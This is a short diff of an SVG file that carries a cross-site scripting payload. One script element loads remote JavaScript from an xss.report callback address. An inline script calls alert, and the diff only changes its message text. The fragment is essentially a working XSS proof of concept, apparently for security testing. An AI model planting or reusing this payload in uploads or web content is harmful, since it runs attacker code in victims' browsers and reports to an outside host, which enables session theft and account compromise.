@@ -12,7 +12,7 @@
     <script xlink:href="https://xss.report/c/whoami" />
     <script>
       //<![CDATA[
-        alert("ble");
+        alert("mitsec");
       ]]>
     </script>
   </svg>
